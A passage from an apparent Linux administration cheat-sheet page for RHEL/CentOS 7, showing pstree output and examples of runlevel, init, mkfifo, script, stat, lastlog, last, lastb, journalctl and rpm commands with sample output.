</span><span class='line'>   ├─dbus-daemon --fork --print-pid 4 --print-address 6 --session
</span><span class='line'>   │   └─{dbus-daemon}
</span><span class='line'>   ├─dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
</span><span class='line'>   │   └─{dbus-daemon}
</span><span class='line'>   ├─dbus-launch --sh-syntax --exit-with-session
</span><span class='line'>   ├─dconf-service
</span><span class='line'>   │   └─2*[{dconf-service}]
</span><span class='line'>   ├─dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
</span><span class='line'>   │   └─dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
</span><span class='line'>   ├─evolution-calen
</span><span class='line'>   │   └─5*[{evolution-calen}]
</span><span class='line'>   ├─evolution-sourc
</span><span class='line'>   │   └─2*[{evolution-sourc}]
</span><span class='line'>   ├─gconfd-2
</span><span class='line'>   ├─gdm
</span><span class='line'>   │   ├─Xorg :0 -background none -noreset -audit 4 -verbose -auth /run/gdm/auth-for-gdm-kJZtDT/database -seat seat0 -nolisten tcp vt1
</span><span class='line'>   │   ├─gdm-session-wor
</span><span class='line'>   │   │   ├─gnome-session --session gnome-classic
</span><span class='line'>   │   │   │   ├─abrt-applet
</span><span class='line'>   │   │   │   │   └─2*[{abrt-applet}]
</span><span class='line'>   │   │   │   ├─gnome-settings-
</span><span class='line'>   │   │   │   │   └─5*[{gnome-settings-}]
</span><span class='line'>   │   │   │   ├─gnome-shell
</span><span class='line'>   │   │   │   │   ├─ibus-daemon --xim --panel disable
</span><span class='line'>   │   │   │   │   │   ├─ibus-dconf
</span><span class='line'>   │   │   │   │   │   │   └─3*[{ibus-dconf}]
</span><span class='line'>   │   │   │   │   │   ├─ibus-engine-sim
</span><span class='line'>   │   │   │   │   │   │   └─2*[{ibus-engine-sim}]
</span><span class='line'>   │   │   │   │   │   └─2*[{ibus-daemon}]
</span><span class='line'>   │   │   │   │   └─6*[{gnome-shell}]
</span><span class='line'>   │   │   │   ├─gnome-software --gapplication-service
</span><span class='line'>   │   │   │   │   └─3*[{gnome-software}]
</span><span class='line'>   │   │   │   ├─nautilus --no-default-window --force-desktop
</span><span class='line'>   │   │   │   │   └─3*[{nautilus}]
</span><span class='line'>   │   │   │   ├─rhsm-icon
</span><span class='line'>   │   │   │   │   └─2*[{rhsm-icon}]
</span><span class='line'>   │   │   │   ├─seapplet
</span><span class='line'>   │   │   │   ├─ssh-agent /bin/sh -c exec -l /bin/bash -c "env GNOME_SHELL_SESSION_MODE=classic gnome-session --session gnome-classic"
</span><span class='line'>   │   │   │   ├─tracker-extract
</span><span class='line'>   │   │   │   │   └─13*[{tracker-extract}]
</span><span class='line'>   │   │   │   ├─tracker-miner-a
</span><span class='line'>   │   │   │   │   └─2*[{tracker-miner-a}]
</span><span class='line'>   │   │   │   ├─tracker-miner-f
</span><span class='line'>   │   │   │   │   └─3*[{tracker-miner-f}]
</span><span class='line'>   │   │   │   ├─tracker-miner-u
</span><span class='line'>   │   │   │   │   └─2*[{tracker-miner-u}]
</span><span class='line'>   │   │   │   └─3*[{gnome-session}]
</span><span class='line'>   │   │   └─2*[{gdm-session-wor}]
</span><span class='line'>   │   └─3*[{gdm}]
</span><span class='line'>   ├─gnome-keyring-d --daemonize --login
</span><span class='line'>   │   └─4*[{gnome-keyring-d}]
</span><span class='line'>   ├─gnome-shell-cal
</span><span class='line'>   │   └─5*[{gnome-shell-cal}]
</span><span class='line'>   ├─gnome-terminal-
</span><span class='line'>   │   ├─bash
</span><span class='line'>   │   │   └─man pstree
</span><span class='line'>   │   │       └─less -s
</span><span class='line'>   │   ├─bash
</span><span class='line'>   │   │   └─pstree -a
</span><span class='line'>   │   ├─gnome-pty-helpe
</span><span class='line'>   │   └─3*[{gnome-terminal-}]
</span><span class='line'>   ├─goa-daemon
</span><span class='line'>   │   └─3*[{goa-daemon}]
</span><span class='line'>   ├─goa-identity-se
</span><span class='line'>   │   └─3*[{goa-identity-se}]
</span><span class='line'>   ├─gsd-printer
</span><span class='line'>   │   └─2*[{gsd-printer}]
</span><span class='line'>   ├─gssproxy -D
</span><span class='line'>   │   └─5*[{gssproxy}]
</span><span class='line'>   ├─gvfs-afc-volume
</span><span class='line'>   │   └─3*[{gvfs-afc-volume}]
</span><span class='line'>   ├─gvfs-goa-volume
</span><span class='line'>   │   └─2*[{gvfs-goa-volume}]
</span><span class='line'>   ├─gvfs-gphoto2-vo
</span><span class='line'>   │   └─2*[{gvfs-gphoto2-vo}]
</span><span class='line'>   ├─gvfs-mtp-volume
</span><span class='line'>   │   └─2*[{gvfs-mtp-volume}]
</span><span class='line'>   ├─gvfs-udisks2-vo
</span><span class='line'>   │   └─2*[{gvfs-udisks2-vo}]
</span><span class='line'>   ├─gvfsd
</span><span class='line'>   │   └─2*[{gvfsd}]
</span><span class='line'>   ├─gvfsd-fuse /run/user/0/gvfs -f -o big_writes
</span><span class='line'>   │   └─5*[{gvfsd-fuse}]
</span><span class='line'>   ├─gvfsd-metadata
</span><span class='line'>   │   └─2*[{gvfsd-metadata}]
</span><span class='line'>   ├─gvfsd-trash --spawner :1.3 /org/gtk/gvfs/exec_spaw/0
</span><span class='line'>   │   └─2*[{gvfsd-trash}]
</span><span class='line'>   ├─ibus-x11 --kill-daemon
</span><span class='line'>   │   └─2*[{ibus-x11}]
</span><span class='line'>   ├─ksmtuned /usr/sbin/ksmtuned
</span><span class='line'>   │   └─sleep 60
</span><span class='line'>   ├─libvirtd
</span><span class='line'>   │   └─15*[{libvirtd}]
</span><span class='line'>   ├─lsmd -d
</span><span class='line'>   ├─lvmetad -f
</span><span class='line'>   ├─master -w
</span><span class='line'>   │   ├─pickup -l -t unix -u
</span><span class='line'>   │   └─qmgr -l -t unix -u
</span><span class='line'>   ├─mcelog --ignorenodev --daemon --syslog
</span><span class='line'>   ├─mission-control
</span><span class='line'>   │   └─3*[{mission-control}]
</span><span class='line'>   ├─packagekitd
</span><span class='line'>   │   └─2*[{packagekitd}]
</span><span class='line'>   ├─polkitd --no-debug
</span><span class='line'>   │   └─5*[{polkitd}]
</span><span class='line'>   ├─pulseaudio --start
</span><span class='line'>   │   └─{pulseaudio}
</span><span class='line'>   ├─rhnsd
</span><span class='line'>   ├─rhsmcertd
</span><span class='line'>   ├─rngd -f
</span><span class='line'>   ├─rsyslogd -n
</span><span class='line'>   │   └─2*[{rsyslogd}]
</span><span class='line'>   ├─rtkit-daemon
</span><span class='line'>   │   └─2*[{rtkit-daemon}]
</span><span class='line'>   ├─smartd -n -q never
</span><span class='line'>   ├─sshd -D
</span><span class='line'>   ├─systemd-journal
</span><span class='line'>   ├─systemd-logind
</span><span class='line'>   ├─systemd-udevd
</span><span class='line'>   ├─tracker-store
</span><span class='line'>   │   └─7*[{tracker-store}]
</span><span class='line'>   ├─tuned -Es /usr/sbin/tuned -l -P
</span><span class='line'>   │   └─4*[{tuned}]
</span><span class='line'>   ├─udisksd --no-debug
</span><span class='line'>   │   └─4*[{udisksd}]
</span><span class='line'>   ├─upowerd
</span><span class='line'>   │   └─2*[{upowerd}]
</span><span class='line'>   ├─vmtoolsd
</span><span class='line'>   │   └─{vmtoolsd}
</span><span class='line'>   ├─vmtoolsd -n vmusr
</span><span class='line'>   └─wpa_supplicant -u -f /var/log/wpa_supplicant.log -c /etc/wpa_supplicant/wpa_supplicant.conf -P /var/run/wpa_supplicant.pid</span></code></pre></td></tr></table></div></figure>


<h4>runlevel</h4>

<blockquote><p>Print previous and current SysV runlevel</p>

<p>If a runlevel cannot be determined, N is printed instead</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> runlevel
</span><span class='line'> N 5</span></code></pre></td></tr></table></div></figure>


<h4>init / telinit</h4>

<ul>
<li>legacy</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> init [OPTIONS...] {COMMAND}
</span><span class='line'> 
</span><span class='line'> Send control commands to the init daemon.
</span><span class='line'> 
</span><span class='line'>      --help      Show this help
</span><span class='line'>      --no-wall   Don't send wall message before halt/power-off/reboot
</span><span class='line'> 
</span><span class='line'> Commands:
</span><span class='line'>   0              Power-off the machine
</span><span class='line'>   6              Reboot the machine
</span><span class='line'>   2, 3, 4, 5     Start runlevelX.target unit
</span><span class='line'>   1, s, S        Enter rescue mode
</span><span class='line'>   q, Q           Reload init daemon configuration
</span><span class='line'>   u, U           Reexecute init daemon</span></code></pre></td></tr></table></div></figure>


<h4>mkfifo</h4>

<blockquote><p>make FIFOs (named pipes)</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> mkfifo /tmp/pipe
</span><span class='line'> [root@tron ~]# ls -l /tmp/pipe
</span><span class='line'> prw-r--r--. 1 root root 0 Sep 27 13:32 /tmp/pipe</span></code></pre></td></tr></table></div></figure>


<h4>script</h4>

<blockquote><p>make typescript of terminal session</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> script
</span><span class='line'> Script started, file is typescript
</span><span class='line'> [root@tron ~]# ls
</span><span class='line'> anaconda-ks.cfg  Downloads             Music          Templates
</span><span class='line'> Desktop          hashes.txt            openscap_data  test.txt
</span><span class='line'> dns.conf         initial-setup-ks.cfg  Pictures       typescript
</span><span class='line'> Documents        man.txt               Public         Videos
</span><span class='line'> [root@tron ~]# rm -f dns.conf hashes.txt
</span><span class='line'> [root@tron ~]# exit
</span><span class='line'> exit
</span><span class='line'> Script done, file is typescript
</span><span class='line'> [root@tron ~]# cat typescript
</span><span class='line'> Script started on Wed 27 Sep 2017 01:34:50 PM EEST
</span><span class='line'> [root@tron ~]# ls
</span><span class='line'> anaconda-ks.cfg  Downloads             Music          Templates
</span><span class='line'> Desktop          hashes.txt            openscap_data  test.txt
</span><span class='line'> dns.conf         initial-setup-ks.cfg  Pictures       typescript
</span><span class='line'> Documents        man.txt               Public         Videos
</span><span class='line'> [root@tron ~]# rm -f dns.conf hashes.txt
</span><span class='line'> [root@tron ~]# exit
</span><span class='line'> exit
</span><span class='line'> 
</span><span class='line'> Script done on Wed 27 Sep 2017 01:35:18 PM EEST</span></code></pre></td></tr></table></div></figure>


<h4>stat</h4>

<blockquote><p>display file or file system status</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> stat hashes.txt
</span><span class='line'>   File: ‘hashes.txt’
</span><span class='line'>   Size: 43           Blocks: 8          IO Block: 4096   regular file
</span><span class='line'> Device: fd00h/64768d Inode: 33859054    Links: 1
</span><span class='line'> Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
</span><span class='line'> Context: unconfined_u:object_r:admin_home_t:s0
</span><span class='line'> Access: 2017-09-26 11:27:18.298105601 +0300
</span><span class='line'> Modify: 2017-09-22 14:14:29.035069557 +0300
</span><span class='line'> Change: 2017-09-22 14:14:29.035069557 +0300
</span><span class='line'>  Birth: -</span></code></pre></td></tr></table></div></figure>


<h4>lastlog</h4>

<blockquote><p>reports the most recent login of all users or of a given user</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lastlog
</span><span class='line'> Username         Port     From             Latest
</span><span class='line'> root             :0                        Sat Oct  7 14:45:28 +0300 2017
</span><span class='line'> bin                                        **Never logged in**
</span><span class='line'> daemon                                     **Never logged in**
</span><span class='line'> adm                                        **Never logged in**
</span><span class='line'> lp                                         **Never logged in**
</span><span class='line'> sync                                       **Never logged in**
</span><span class='line'> shutdown                                   **Never logged in**
</span><span class='line'> halt                                       **Never logged in**
</span><span class='line'> mail                                       **Never logged in**
</span><span class='line'> operator                                   **Never logged in**
</span><span class='line'> games                                      **Never logged in**
</span><span class='line'> ftp                                        **Never logged in**
</span><span class='line'> nobody                                     **Never logged in**
</span><span class='line'> systemd-bus-proxy                           **Never logged in**
</span><span class='line'> systemd-network                            **Never logged in**
</span><span class='line'> dbus                                       **Never logged in**
</span><span class='line'> polkitd                                    **Never logged in**
</span><span class='line'> abrt                                       **Never logged in**
</span><span class='line'> unbound                                    **Never logged in**
</span><span class='line'> tss                                        **Never logged in**
</span><span class='line'> colord                                     **Never logged in**
</span><span class='line'> usbmuxd                                    **Never logged in**
</span><span class='line'> geoclue                                    **Never logged in**
</span><span class='line'> saslauth                                   **Never logged in**
</span><span class='line'> libstoragemgmt                             **Never logged in**
</span><span class='line'> rpc                                        **Never logged in**
</span><span class='line'> rtkit                                      **Never logged in**
</span><span class='line'> chrony                                     **Never logged in**
</span><span class='line'> radvd                                      **Never logged in**
</span><span class='line'> qemu                                       **Never logged in**
</span><span class='line'> ntp                                        **Never logged in**
</span><span class='line'> rpcuser                                    **Never logged in**
</span><span class='line'> nfsnobody                                  **Never logged in**
</span><span class='line'> avahi-autoipd                              **Never logged in**
</span><span class='line'> setroubleshoot                             **Never logged in**
</span><span class='line'> sssd                                       **Never logged in**
</span><span class='line'> pulse                                      **Never logged in**
</span><span class='line'> gdm              :0                        Sat Oct  7 14:42:55 +0300 2017
</span><span class='line'> gnome-initial-setup :0                        Tue Apr 26 15:36:08 +0300 2016
</span><span class='line'> sshd                                       **Never logged in**
</span><span class='line'> avahi                                      **Never logged in**
</span><span class='line'> postfix                                    **Never logged in**
</span><span class='line'> tcpdump                                    **Never logged in**
</span><span class='line'> nixhat           :0                        Sat Aug 19 20:00:48 +0300 2017
</span><span class='line'> apache                                     **Never logged in**
</span><span class='line'> smbuser                                    **Never logged in**
</span><span class='line'> squid                                      **Never logged in**</span></code></pre></td></tr></table></div></figure>


<ul>
<li>see last time a user logged in</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lastlog -u root
</span><span class='line'> Username         Port     From             Latest
</span><span class='line'> root             :0                        Sat Oct  7 14:45:28 +0300 2017</span></code></pre></td></tr></table></div></figure>


<h4>last</h4>

<blockquote><p>show listing of last logged in users</p>

<p>Last searches back through the file /var/log/wtmp (or the  file  designated  by  the
f flag) and displays a list of all users logged in (and out) since that file was
created.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> last -n 10
</span><span class='line'> root     pts/1        :0               Sat Oct  7 14:53   still logged in   
</span><span class='line'> root     pts/0        :0               Sat Oct  7 14:45   still logged in   
</span><span class='line'> root     :0           :0               Sat Oct  7 14:45   still logged in   
</span><span class='line'> (unknown :0           :0               Sat Oct  7 14:42 - 14:45  (00:02)    
</span><span class='line'> reboot   system boot  3.10.0-514.21.1. Sat Oct  7 14:41 - 14:54  (00:13)    
</span><span class='line'> root     pts/1        :0               Fri Oct  6 21:48 - 23:19  (01:30)    
</span><span class='line'> root     pts/0        :0               Fri Oct  6 21:47 - 23:19  (01:32)    
</span><span class='line'> root     :0           :0               Fri Oct  6 21:43 - 23:19  (01:36)    
</span><span class='line'> (unknown :0           :0               Fri Oct  6 21:37 - 21:43  (00:05)    
</span><span class='line'> reboot   system boot  3.10.0-514.21.1. Fri Oct  6 21:36 - 23:19  (01:43)    
</span><span class='line'> 
</span><span class='line'> wtmp begins Tue Apr 26 15:32:43 2016</span></code></pre></td></tr></table></div></figure>


<h4>lastb</h4>

<blockquote><p>shows a log of the file /var/log/btmp, which contains all the bad login attempts</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lastb
</span><span class='line'> root     :0           :0               Sat Oct  7 14:57 - 14:57  (00:00)    
</span><span class='line'> root     :0           :0               Sat Oct  7 14:57 - 14:57  (00:00)    
</span><span class='line'> nixhat   :0           :0               Sat Oct  7 14:57 - 14:57  (00:00)    
</span><span class='line'> 
</span><span class='line'> btmp begins Sat Oct  7 14:57:26 2017</span></code></pre></td></tr></table></div></figure>


<h4>logrotate</h4>

<blockquote><p>rotates, compresses, and mails system logs</p></blockquote>

<p> Config file: <strong>/etc/logrotate.conf</strong></p>

<h4>journalctl</h4>

<blockquote><p>Query the systemd journal</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> journalctl -u httpd.service
</span><span class='line'> -- Logs begin at Sat 2017-10-07 14:41:21 EEST, end at Sat 2017-10-07 15:34:36 EE
</span><span class='line'> Oct 07 14:42:14 localhost.localdomain systemd[1]: Starting The Apache HTTP Serve
</span><span class='line'> Oct 07 14:42:23 localhost.localdomain httpd[1099]: AH00558: httpd: Could not rel
</span><span class='line'> Oct 07 14:42:24 localhost.localdomain systemd[1]: Started The Apache HTTP Server
</span><span class='line'> Oct 07 15:11:02 localhost.localdomain httpd[6068]: AH00558: httpd: Could not rel
</span><span class='line'> Oct 07 15:11:02 localhost.localdomain systemd[1]: Reloaded The Apache HTTP Serve</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show boot log</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> journalctl -b | tail
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Created slice user-993.slice.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Starting user-993.slice.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Started Session 45 of user pcp.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Starting Session 45 of user pcp.
</span><span class='line'> Jan 25 18:28:01 rhel7 CROND[6820]: (pcp) CMD ( /usr/libexec/pcp/bin/pmie_check -C)
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Removed slice user-993.slice.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Stopping user-993.slice.
</span><span class='line'> Jan 25 18:30:01 rhel7 systemd[1]: Started Session 46 of user root.
</span><span class='line'> Jan 25 18:30:01 rhel7 systemd[1]: Starting Session 46 of user root.
</span><span class='line'> Jan 25 18:30:01 rhel7 CROND[6978]: (root) CMD (/usr/lib64/sa/sa1 1 1)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show error events</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> journalctl -p err
</span><span class='line'> -- Logs begin at Thu 2018-01-25 14:28:07 EET, end at Thu 2018-01-25 18:30:01 EET. --
</span><span class='line'> Jan 25 14:28:10 rhel7 kernel: piix4_smbus 0000:00:07.3: Host SMBus controller not enabled!
</span><span class='line'> Jan 25 14:28:11 rhel7 kernel: intel_rapl: no valid rapl domains found in package 0
</span><span class='line'> Jan 25 14:28:35 rhel7 cntlm[1121]: Error creating a new PID file
</span><span class='line'> Jan 25 14:28:45 rhel7 spice-vdagent[2501]: Cannot access vdagent virtio channel /dev/virtio-ports/com.redhat.spice.0
</span><span class='line'> Jan 25 14:28:57 rhel7 udisksd[2652]: Error probing device: Error sending ATA command IDENTIFY PACKET DEVICE to /dev/sr0: ATA command failed: error=0x01 count=0x02 status=0x5
</span><span class='line'> Jan 25 14:47:48 rhel7 gdm-launch-environment][2380]: pam_systemd(gdm-launch-environment:session): Failed to release session: Interrupted system call
</span><span class='line'> Jan 25 14:47:50 rhel7 spice-vdagent[3306]: Cannot access vdagent virtio channel /dev/virtio-ports/com.redhat.spice.0
</span><span class='line'> Jan 25 14:48:15 rhel7 pulseaudio[3318]: GetManagedObjects() failed: org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote applicat
</span><span class='line'> Jan 25 14:53:38 rhel7 kernel: ata4: exception Emask 0x10 SAct 0x0 SErr 0x4010000 action 0xe frozen
</span><span class='line'> Jan 25 14:53:38 rhel7 kernel: ata4: irq_stat 0x00400040, connection status changed
</span><span class='line'> Jan 25 14:53:38 rhel7 kernel: ata4: SError: { PHYRdyChg DevExch }</span></code></pre></td></tr></table></div></figure>


<h4>rpm</h4>

<blockquote><p>RPM Package Manager</p></blockquote>

<ul>
<li>count all installed packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpqm -qa | wc -l
</span><span class='line'>1366</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get info about installed package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -qi samba
</span><span class='line'> Name        : samba
</span><span class='line'> Epoch       : 0
</span><span class='line'> Version     : 4.4.4
</span><span class='line'> Release     : 14.el7_3
</span><span class='line'> Architecture: x86_64
</span><span class='line'> Install Date: Thu 08 Jun 2017 10:55:00 AM EEST
</span><span class='line'> Group       : System Environment/Daemons
</span><span class='line'> Size        : 1869228
</span><span class='line'> License     : GPLv3+ and LGPLv3+
</span><span class='line'> Signature   : RSA/SHA256, Thu 25 May 2017 04:16:22 PM EEST, Key ID 24c6a8a7f4a80eb5
</span><span class='line'> Source RPM  : samba-4.4.4-14.el7_3.src.rpm
</span><span class='line'> Build Date  : Thu 25 May 2017 02:35:40 PM EEST
</span><span class='line'> Build Host  : c1bm.rdu2.centos.org
</span><span class='line'> Relocations : (not relocatable)
</span><span class='line'> Packager    : CentOS BuildSystem &lt;http://bugs.centos.org&gt;
</span><span class='line'> Vendor      : CentOS
</span><span class='line'> URL         : http://www.samba.org/
</span><span class='line'> Summary     : Server and Client software to interoperate with Windows machines
</span><span class='line'> Description :
</span><span class='line'> Samba is the standard Windows interoperability suite of programs for Linux and
</span><span class='line'> Unix.</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list files in package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -ql lynx
</span><span class='line'> /etc/lynx-site.cfg
</span><span class='line'> /etc/lynx.cfg
</span><span class='line'> /etc/lynx.lss
</span><span class='line'> /usr/bin/lynx
</span><span class='line'> /usr/share/doc/lynx-2.8.8
</span><span class='line'> [...]
</span><span class='line'> /usr/share/locale/zh_TW/LC_MESSAGES/lynx.mo
</span><span class='line'> /usr/share/man/man1/lynx.1.gz</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list config files</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -qc name</span></code></pre></td></tr></table></div></figure>


<ul>
<li>install RPM package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -i pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>upgrade package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -U pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>remove package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -e pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>see where file comes from</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -qf /etc/httpd/conf
</span><span class='line'> httpd-2.4.6-45.el7.centos.4.x86_64</span></code></pre></td></tr></table></div></figure>


<ul>
<li>verify package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -V pgkname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list documentation files</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
